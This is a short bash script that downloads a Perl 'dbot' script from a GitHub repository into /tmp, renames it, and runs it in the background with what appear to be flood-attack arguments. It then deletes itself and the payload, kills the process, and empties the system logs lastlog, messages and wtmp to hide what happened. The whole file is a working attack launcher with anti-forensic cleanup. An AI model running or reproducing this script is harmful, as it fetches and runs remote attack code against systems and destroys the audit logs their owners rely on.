#!/usr/bin/bash
cd /tmp
wget https://raw.githubusercontent.com/TheDozer/thedozer/115066cc033336edfa5d920063f4659ab268ea08/dbot.pl
mv dbot.pl $1
nohup perl $1 $2 800 200 127.0.0.1 &
sleep $3
rm /tmp/$1
rm /tmp/nohup.out
rm /tmp/d0zer.sh
pkill -f $1
echo "" > /var/log/lastlog
echo "" > /var/log/messages
echo "" > /var/log/wtmp
